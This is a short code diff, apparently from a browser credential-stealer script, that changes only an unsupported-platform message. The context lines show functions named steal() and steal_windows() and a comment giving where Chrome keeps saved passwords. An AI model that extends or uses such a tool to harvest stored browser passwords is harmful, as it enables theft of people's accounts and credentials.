@@ -9,7 +9,7 @@ def steal():
 	if platform.system() == "Windows":
 		steal_windows()
 	else:
-		print("Sorry, Linux and Mac OSX are not supported yet")
+		print("[-] Only Windows is supported")
 
 def steal_windows():
 	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
